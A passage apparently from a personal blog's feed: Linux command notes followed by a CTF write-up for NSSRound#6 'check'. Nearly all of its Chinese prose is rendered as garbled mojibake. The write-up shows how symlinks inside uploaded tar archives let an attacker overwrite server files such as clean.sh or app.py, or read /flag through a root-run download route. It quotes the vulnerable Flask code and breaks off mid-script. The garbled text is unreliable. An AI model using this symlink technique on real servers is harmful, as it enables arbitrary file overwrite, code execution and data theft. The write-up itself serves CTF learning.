align="center">ä»£è¡¨å¯¹è±¡æ˜¯å¯è¯»çš„</td><td align="center">æ–‡ä»¶å±ä¸»çš„æƒé™</td></tr><tr><td align="center">w</td><td align="center">ä»£è¡¨å¯¹è±¡æ˜¯å¯å†™çš„</td><td align="center">å±ä¸»æˆå‘˜çš„æƒé™</td></tr><tr><td align="center">x</td><td align="center">ä»£è¡¨å¯¹è±¡æ˜¯å¯æ‰§è¡Œçš„</td><td align="center">å…¶ä»–ç”¨æˆ·çš„æƒé™</td></tr></tbody></table><blockquote><p>è‹¥æ²¡æœ‰æŸç§æƒé™ï¼Œåœ¨è¯¥æƒé™ä½ä¼šå‡ºç°å•ç ´æŠ˜çº¿ã€‚</p><p>å±ä¸»æˆå‘˜æŒ‡çš„æ˜¯ä¸æ–‡ä»¶å±ä¸»åœ¨åŒä¸€ä¸ªç”¨æˆ·ç»„çš„æˆå‘˜</p><p>å…¶ä»–ç”¨æˆ·æŒ‡çš„æ˜¯ä¸æ–‡ä»¶å±ä¸»ä¸åœ¨åŒä¸€ä¸ªç”¨æˆ·ç»„çš„æˆå‘˜</p></blockquote></li></ul><img src="../images/image-20220927165623523.png" alt="image-20220927165623523" style="zoom:67%;" /><h4 id="æ”¹å˜æƒé™"><a href="#æ”¹å˜æƒé™" class="headerlink" title="æ”¹å˜æƒé™"></a>æ”¹å˜æƒé™</h4><p>chmod</p><img src="../images/image-20221030190551191.png" alt="image-20221030190551191" style="zoom: 67%;" /><p>å…«è¿›åˆ¶æ³•</p><p><code>sudo  chmod 777  filename</code></p><blockquote><p>777ç”±ä¸Šå›¾å¯çŸ¥æ˜¯èµ‹äºˆå…¨éƒ¨æƒé™</p></blockquote><h4 id="è®¾ç½®é»˜è®¤æƒé™"><a href="#è®¾ç½®é»˜è®¤æƒé™" class="headerlink" title="è®¾ç½®é»˜è®¤æƒé™"></a>è®¾ç½®é»˜è®¤æƒé™</h4><p>umask</p><p><img src="/../images/image-20230318143219603.png" alt="image-20230318143219603"></p><p><img src="/../images/image-20230318143232817.png" alt="image-20230318143232817"></p><p>æ–‡ä»¶æƒé™&#x3D;777-umask&#x3D;755</p><h2 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><h3 id="æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶"><a href="#æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶"></a>æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶</h3><ul><li><code>ls</code></li></ul><table><thead><tr><th align="center">å¯é€‰å‚æ•°</th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">-l</td><td align="center">æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</td></tr><tr><td align="center">-a</td><td align="center">æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—æ–‡ä»¶ï¼‰</td></tr><tr><td align="center">-R</td><td align="center">å±•ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶</td></tr><tr><td align="center">-i</td><td align="center">å±•ç¤ºæ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹</td></tr><tr><td align="center">-F</td><td align="center">å±•ç¤ºæ–‡ä»¶ç±»å‹</td></tr></tbody></table><blockquote><p>-F</p><p>ç›®å½•ååŠ ä¸Š<code>/</code></p><p>å¯æ‰§è¡Œæ–‡ä»¶ååŠ ä¸Š<code>*</code></p></blockquote><p><img src="/../images/image-20220819201845329.png" alt="image-20220819201845329"></p><ul><li><code>dir</code></li><li><code>vdir</code> ç­‰ä»·äº <code>ls -l</code></li></ul><h3 id="æŸ¥çœ‹ç›®å½•ç»“æ„"><a href="#æŸ¥çœ‹ç›®å½•ç»“æ„" class="headerlink" title="æŸ¥çœ‹ç›®å½•ç»“æ„"></a>æŸ¥çœ‹ç›®å½•ç»“æ„</h3><p><code>tree dir</code></p><p><img src="/../images/image-20220818190348296.png" alt="image-20220818190348296"></p><h3 id="åˆ›å»ºç›®å½•"><a href="#åˆ›å»ºç›®å½•" class="headerlink" title="åˆ›å»ºç›®å½•"></a>åˆ›å»ºç›®å½•</h3><ul><li><p><code>mkdir dir_name</code>ï¼šåˆ›å»ºå•ä¸ªç›®å½•</p></li><li><p><code>mkdir dir1/dir2/dir3</code>ï¼šåˆ›å»ºå¤šä¸ªç›®å½•</p><p><img src="/../images/image-20220920223042434.png" alt="image-20220920223042434"></p></li></ul><h3 id="åˆ é™¤ç›®å½•"><a href="#åˆ é™¤ç›®å½•" class="headerlink" title="åˆ é™¤ç›®å½•"></a>åˆ é™¤ç›®å½•</h3><ul><li><p><code>rmdir dir_name</code>ï¼šåˆ é™¤ç©ºç›®å½•</p></li><li><p><code>rm  -rf  dir_name</code>ï¼šåˆ é™¤éç©ºç›®å½•</p><blockquote><p>ä¸ä½¿ç”¨-få‚æ•°çš„è¯ï¼Œéœ€è¦ä¸€ä¸€ç¡®å®šæ˜¯å¦åˆ é™¤å­ç›®å½•å’Œæ–‡ä»¶</p><p>æ›´å®‰å…¨ï¼Œä½†æ˜¯æ›´éº»çƒ¦</p></blockquote></li></ul><h3 id="åˆ‡æ¢åˆ°æŸä¸ªç›®å½•"><a href="#åˆ‡æ¢åˆ°æŸä¸ªç›®å½•" class="headerlink" title="åˆ‡æ¢åˆ°æŸä¸ªç›®å½•"></a>åˆ‡æ¢åˆ°æŸä¸ªç›®å½•</h3><p><code>cd dir_path</code></p><h3 id="æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½•"><a href="#æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½•" class="headerlink" title="æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½•"></a>æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½•</h3><p><code>pwd</code></p><h2 id="è¿›ç¨‹â€“process"><a href="#è¿›ç¨‹â€“process" class="headerlink" title="è¿›ç¨‹â€“process"></a>è¿›ç¨‹â€“process</h2><h3 id="æŸ¥çœ‹è¿›ç¨‹"><a href="#æŸ¥çœ‹è¿›ç¨‹" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹"></a>æŸ¥çœ‹è¿›ç¨‹</h3><ul><li>ps</li></ul><p><img src="/../images/image-20220819201116476.png" alt="image-20220819201116476"></p><p>æ˜¾ç¤ºäº†ç¨‹åºçš„è¿›ç¨‹IDï¼ˆProcess IDï¼ŒPIDï¼‰ï¼Œå®ƒä»¬è¿è¡Œåœ¨å“ªä¸ªç»ˆç«¯ï¼ˆTTYï¼‰ï¼Œä»¥åŠè¿›ç¨‹å·²ç”¨çš„CPUæ—¶é—´ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">ps -aux | grep apache <span class="comment"># ä¸grepè”ç”¨æŸ¥æ‰¾apacheè¿›ç¨‹</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-A æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹</span><br><span class="line">a æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹</span><br><span class="line">-a æ˜¾ç¤ºåŒä¸€ç»ˆç«¯ä¸‹æ‰€æœ‰è¿›ç¨‹</span><br><span class="line">c æ˜¾ç¤ºè¿›ç¨‹çœŸå®åç§°</span><br><span class="line">e æ˜¾ç¤ºç¯å¢ƒå˜é‡</span><br><span class="line">f æ˜¾ç¤ºè¿›ç¨‹é—´çš„å…³ç³»</span><br><span class="line">r æ˜¾ç¤ºå½“å‰ç»ˆç«¯è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">-aux æ˜¾ç¤ºæ‰€æœ‰åŒ…å«å…¶å®ƒä½¿ç”¨çš„è¿›ç¨‹</span><br></pre></td></tr></table></figure><ul><li>top</li></ul><img src="../images/image-20220922144049498.png" alt="image-20220922144049498" style="zoom: 67%;" /><blockquote><p>ä¸psä¸åŒçš„ç‚¹åœ¨äºï¼Œpsåªèƒ½æ˜¾ç¤ºä¸€ä¸ªæ—¶é—´ç‚¹çš„è¿›ç¨‹ä¿¡æ¯ï¼Œè€Œtopæ˜¯å®æ—¶æ›´æ–°ï¼Œå°±åƒwindowsçš„ä»»åŠ¡ç®¡ç†å™¨ã€‚</p></blockquote><p>äº¤äº’å‘½ä»¤ï¼šè¾“å…¥qé€€å‡ºtopå‘½ä»¤ã€‚</p><ul><li><p>lsof</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -p pid   //æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€äº†å“ªäº›æ–‡ä»¶</span><br></pre></td></tr></table></figure></li></ul><h3 id="ç»“æŸè¿›ç¨‹"><a href="#ç»“æŸè¿›ç¨‹" class="headerlink" title="ç»“æŸè¿›ç¨‹"></a>ç»“æŸè¿›ç¨‹</h3><blockquote><p>åœ¨Linuxä¸­ï¼Œè¿›ç¨‹ä¹‹é—´é€šè¿‡ä¿¡å·æ¥é€šä¿¡ã€‚</p></blockquote><img src="../images/image-20220922144615297.png" alt="image-20220922144615297" style="zoom: 67%;" /><ul><li><p><code>kill pid</code>ï¼šé€šè¿‡è¿›ç¨‹çš„pidæ¥ç»“æŸè¿›ç¨‹</p></li><li><p><code>kill -9 pid</code>ï¼šå¼ºåˆ¶ç»“æŸ</p></li><li><p><code>killall  process_name</code>ï¼šé€šè¿‡è¿›ç¨‹åç»“æŸè¿›ç¨‹ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">killall http*</span><br><span class="line">ä¸Šé¢çš„å‘½ä»¤ç»“æŸäº†æ‰€æœ‰ä»¥httpå¼€å¤´çš„è¿›ç¨‹</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç”¨æˆ·"><a href="#ç”¨æˆ·" class="headerlink" title="ç”¨æˆ·"></a>ç”¨æˆ·</h2><h3 id="åˆ‡æ¢ç”¨æˆ·"><a href="#åˆ‡æ¢ç”¨æˆ·" class="headerlink" title="åˆ‡æ¢ç”¨æˆ·"></a>åˆ‡æ¢ç”¨æˆ·</h3><p>su  -  ç”¨æˆ·å</p><p>é«˜æƒé™åˆ‡æ¢ä½æƒé™æ— éœ€å¯†ç ï¼Œåä¹‹éœ€è¦ã€‚</p><h3 id="æŸ¥çœ‹ç¬¬ä¸€æ¬¡ç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·"><a href="#æŸ¥çœ‹ç¬¬ä¸€æ¬¡ç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·" class="headerlink" title="æŸ¥çœ‹ç¬¬ä¸€æ¬¡ç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·"></a>æŸ¥çœ‹ç¬¬ä¸€æ¬¡ç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·</h3><p>who am i</p><h2 id="ç‰¹æ®Šç¬¦å·"><a href="#ç‰¹æ®Šç¬¦å·" class="headerlink" title="ç‰¹æ®Šç¬¦å·"></a>ç‰¹æ®Šç¬¦å·</h2><table><thead><tr><th align="center"></th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">#</td><td align="center">æ³¨é‡Šåé¢çš„å‘½ä»¤</td></tr><tr><td align="center">ï¼›</td><td align="center">ä¾æ¬¡æ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">|</td><td align="center">ç®¡é“ï¼Œå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</td></tr><tr><td align="center">||</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">&amp;</td><td align="center">åå°æ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">$?</td><td align="center">å­˜å‚¨ä¸Šä¸€æ¡å‘½ä»¤çš„æ‰§è¡Œç»“æœ</td></tr></tbody></table><h2 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h2><h3 id="æŸ¥çœ‹ip"><a href="#æŸ¥çœ‹ip" class="headerlink" title="æŸ¥çœ‹ip"></a>æŸ¥çœ‹ip</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address show</span><br><span class="line"></span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><h3 id="æŠ“å–æœåŠ¡æµé‡"><a href="#æŠ“å–æœåŠ¡æµé‡" class="headerlink" title="æŠ“å–æœåŠ¡æµé‡"></a>æŠ“å–æœåŠ¡æµé‡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i lo port 6379 -w redis.pcapng</span><br></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾å‘½ä»¤"><a href="#æŸ¥æ‰¾å‘½ä»¤" class="headerlink" title="æŸ¥æ‰¾å‘½ä»¤"></a>æŸ¥æ‰¾å‘½ä»¤</h2><p><img src="/../images/image-20221007162424354.png" alt="image-20221007162424354"></p><ul><li><p><code>find</code></p><p><img src="/../images/image-20230221171347974.png" alt="image-20230221171347974"></p><p><img src="/../images/image-20230324204821642.png" alt="image-20230324204821642"></p></li><li><p><code>locate</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æ›´æ–°ç´¢å¼•æ•°æ®åº“</span></span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç«¯å£"><a href="#ç«¯å£" class="headerlink" title="ç«¯å£"></a>ç«¯å£</h2><blockquote><p>ç«¯å£æ˜¯é€šè¿‡ç«¯å£å·æ¥æ ‡è®°çš„ï¼Œç«¯å£å·åªæœ‰æ•´æ•°ï¼ŒèŒƒå›´æ˜¯ä»0~65535 </p></blockquote><p><a href="https://www.runoob.com/w3cnote/linux-check-port-usage.html">https://www.runoob.com/w3cnote/linux-check-port-usage.html</a></p><ul><li><p>lsof</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i:8000  //æŸ¥çœ‹8000ç«¯å£å ç”¨æƒ…å†µ</span><br></pre></td></tr></table></figure></li><li><p><code>netstat</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -ntlp   //æŸ¥çœ‹å½“å‰æ‰€æœ‰tcpç«¯å£</span><br><span class="line">netstat -ntulp | grep 80   //æŸ¥çœ‹æ‰€æœ‰80ç«¯å£ä½¿ç”¨æƒ…å†µ</span><br><span class="line">netstat -ntulp | grep 3306   //æŸ¥çœ‹æ‰€æœ‰3306ç«¯å£ä½¿ç”¨æƒ…å†µ</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804194025228.png" alt="image-20220804194025228"></p></li></ul><h2 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl  command  æœåŠ¡</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">command</th><th align="center">mean</th></tr></thead><tbody><tr><td align="center">status</td><td align="center">æŸ¥çœ‹æœåŠ¡çŠ¶æ€</td></tr><tr><td align="center">start</td><td align="center">å¯åŠ¨æœåŠ¡</td></tr><tr><td align="center">restart</td><td align="center">é‡å¯æœåŠ¡</td></tr><tr><td align="center">stop</td><td align="center">åœæ­¢æœåŠ¡</td></tr><tr><td align="center">enable</td><td align="center">å¼€æœºè‡ªå¯æœåŠ¡</td></tr><tr><td align="center">disable</td><td align="center">å–æ¶ˆå¼€æœºè‡ªå¯æœåŠ¡</td></tr></tbody></table><p>reload:ä¸å…³é—­unitçš„æƒ…å†µä¸‹,é‡æ–°è½½å…¥é…ç½®æ–‡ä»¶,è®©è®¾ç½®ç”Ÿæ•ˆã€‚<br>is- active:ç›®å‰æœ‰æ²¡æœ‰æ­£åœ¨è¿è¡Œä¸­ã€‚<br>is- enabled:å¼€æœºæ—¶æœ‰æ²¡æœ‰é»˜è®¤è¦å¯ç”¨è¿™ä¸ªunitã€‚<br>kill:ä¸è¦è¢«killè¿™ä¸ªåå­—å“ç€äº†,å®ƒå…¶å®æ˜¯å‘è¿è¡Œunitçš„è¿›ç¨‹å‘é€ä¿¡å·<br>show:åˆ—å‡ºunitçš„é…ç½®ã€‚<br>mask:ç¦ç”¨æœåŠ¡<br>unmask:å–æ¶ˆå¯¹æœåŠ¡çš„ç¦ç”¨</p><p>list-unit-files|grep enable:åˆ—å‡ºæ‰€æœ‰è‡ªå¯åŠ¨æœåŠ¡</p><p><img src="/../images/image-20221024194730467.png" alt="image-20221024194730467"></p><p>loadedï¼šå¼€æœºæ˜¯å¦è‡ªå¯åŠ¨ï¼Œenabledè¯´æ˜æ˜¯è‡ªå¯åŠ¨çš„</p><p>activeï¼šç°åœ¨æ˜¯å¦å¯åŠ¨ï¼Œactiveï¼ˆrunning)è¯´æ˜æ­£åœ¨</p><h2 id="ä½¿ç”¨æŠ€å·§"><a href="#ä½¿ç”¨æŠ€å·§" class="headerlink" title="ä½¿ç”¨æŠ€å·§"></a>ä½¿ç”¨æŠ€å·§</h2><p><img src="/../../../../blog/source/images/image-20230221171851141-1693403138821.png" alt="image-20230221171851141"></p><p><img src="/../../../../blog/source/images/image-20230221171905266-1693403138820.png" alt="image-20230221171905266"></p><h3 id="ä¸ºå‘½ä»¤èµ·åˆ«å"><a href="#ä¸ºå‘½ä»¤èµ·åˆ«å" class="headerlink" title="ä¸ºå‘½ä»¤èµ·åˆ«å"></a>ä¸ºå‘½ä»¤èµ·åˆ«å</h3><blockquote><p><code>alias</code>å‘½ä»¤æ˜¯å¦ä¸€ä¸ªshellçš„å†…å»ºå‘½ä»¤ã€‚å‘½ä»¤åˆ«åå…è®¸ä½ ä¸ºå¸¸ç”¨çš„å‘½ä»¤ï¼ˆåŠå…¶å‚æ•°ï¼‰åˆ›å»ºå¦ä¸€</p><p>ä¸ªåç§°ï¼Œä»è€Œå°†è¾“å…¥é‡å‡å°‘åˆ°æœ€ä½ã€‚</p></blockquote><p><code>alias åˆ«å=&#39;åŸå‘½ä»¤&#39;</code></p><p>ä¸‹é¢ä¸ºå±•ç¤ºéšè—æ–‡ä»¶çš„lså‘½ä»¤èµ·åˆ«å<code>la</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# alias la=&#x27;ls -a&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  .cshrc  H1ve  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  web</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„å‘½ä»¤åˆ«åå±äºå†…éƒ¨å‘½ä»¤ï¼Œä¸€ä¸ªåˆ«åä»…åœ¨å®ƒæ‰€è¢«å®šä¹‰çš„shellè¿›ç¨‹ä¸­æ‰æœ‰æ•ˆã€‚</p><p>å¯ä»¥é€šè¿‡åœ¨~&#x2F;.bashrcæ–‡ä»¶å†…ç¼–å†™ï¼Œå·²è¾¾åˆ°æ°¸ä¹…ç”Ÿæ•ˆçš„æ•ˆæœ</p></blockquote><h3 id="æ‰§è¡Œå†å²å‘½ä»¤"><a href="#æ‰§è¡Œå†å²å‘½ä»¤" class="headerlink" title="æ‰§è¡Œå†å²å‘½ä»¤"></a>æ‰§è¡Œå†å²å‘½ä»¤</h3><p>å…ˆç”¨<code>history</code>å‘½ä»¤æŸ¥çœ‹å†å²å‘½ä»¤è®°å½•ï¼Œå†ç”¨<code>ï¼+ å‘½ä»¤ç¼–å·</code>æ‰§è¡Œå†å²å‘½ä»¤ã€‚</p><p><img src="/../../../../blog/source/images/image-20220923183323571-1693403159124.png" alt="image-20220923183323571"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 6</title>
      <link href="/2023/05/31/NSSRound6/"/>
      <url>/2023/05/31/NSSRound6/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-6-Team-check"><a href="#NSSRound-6-Team-check" class="headerlink" title="[NSSRound#6 Team]check"></a>[NSSRound#6 Team]check</h1><h2 id="V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><blockquote><p>æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¬¦å·é“¾æ¥è¾¾åˆ°ä»»æ„è¦†ç›–&#x2F;ä¸Šä¼ æ–‡ä»¶çš„æ•ˆæœã€‚</p></blockquote><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>å‡è®¾æˆ‘ä»¬è¦è¦†ç›–&#x2F;home&#x2F;khaz&#x2F;shellç›®å½•ä¸‹çš„1.shæ–‡ä»¶</p><p><img src="/../images/image-20221020234420015-1686150537835.png" alt="image-20221020234420015"></p><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘è¿™ä¸ªç›®å½•ï¼Œå¹¶å°†å…¶æ‰“åŒ…æˆå‹ç¼©åŒ…1ã€‚</p><p><img src="/../images/image-20221020234340481-1686150537835.png" alt="image-20221020234340481"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦å†åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åå­—ç›¸åŒçš„ç›®å½•ï¼Œå¹¶åœ¨è¿™ä¸ªç›®å½•ä¸‹åˆ›å»ºè¦è¦†ç›–çš„æ–‡ä»¶ã€‚ç„¶åå°†è¯¥ç›®å½•æ‰“åŒ…ä¸ºå‹ç¼©åŒ…2ã€‚</p><p><img src="/../images/image-20221020234743494-1686150537835.png" alt="image-20221020234743494"></p><p>ç„¶åè§£å‹å‹ç¼©åŒ…1ï¼Œå¾—åˆ°testï¼Œç„¶åè§£å‹å‹ç¼©åŒ…2ï¼Œå…¶ä¸­test&#x2F;clean.shï¼Œå› ä¸ºå½“å‰ç›®å½•ä¸‹testæ˜¯æŒ‡å‘&#x2F;home&#x2F;khaz&#x2F;shellçš„ï¼Œæ‰€ä»¥å®é™…ä¸Šä¼šå°†clean.shè§£å‹åˆ°&#x2F;home&#x2F;khaz&#x2F;shellä¸‹ä»è€Œè¦†ç›–åŸæ¥çš„clean.shã€‚</p><p><img src="/../images/image-20221020234513190-1686150537835.png" alt="image-20221020234513190"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>åšçš„æ—¶å€™ï¼Œå‘ç°åå¼¹shellä¸ç”Ÿæ•ˆï¼Œåœ¨æœ¬åœ°æµ‹è¯•åå‘ç°æ˜¯å› ä¸ºæ²¡æœ‰ç»™clean.shæƒé™ï¼Œæ‰€ä»¥è¦†ç›–åå°±ä¸èƒ½æ‰§è¡Œäº†ã€‚</p><p><img src="/../images/Snipaste_2022-10-21_18-51-12-1686150537835.png" alt="Snipaste_2022-10-21_18-51-12"></p><p>psï¼šè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯æ—¢ç„¶å¯ä»¥ä»»æ„ä¸Šä¼ &#x2F;è¦†ç›–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è¦†ç›–app.pyæ–‡ä»¶ã€‚</p><p>â€‹è¿™æ˜¯å› ä¸ºæ¯æ¬¡ä¿®æ”¹å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œflaskéƒ½ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20221021202646267-1686150537835.png" alt="image-20221021202646267"></p><h2 id="V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½</h2><blockquote><p>æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶æä¾›ä¸‹è½½åŠŸèƒ½ã€‚å¯¼è‡´è§£å‹å‡ºæ¥çš„æ–‡ä»¶å¦‚æœæ˜¯ç¬¦å·é“¾æ¥æ–‡ä»¶å°±å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>ä¸v1ç›¸æ¯”ä¸åŒç‚¹åœ¨äº<code>su ctf -c /tmp/clean.sh</code>é™åˆ¶äº†ç”¨æˆ·æƒé™ï¼Œä½†æ˜¯flaskè¿˜æ˜¯ä»¥rootæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥ä¸‹è½½åŠŸèƒ½è¿˜æ˜¯rootæƒé™ã€‚</p><p>æ„é€ ç¬¦å·é“¾æ¥æŒ‡å‘<code>/flag</code>ï¼Œåˆ©ç”¨ä¸‹è½½åŠŸèƒ½å°±èƒ½å¤Ÿè¯»å–åˆ°flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = 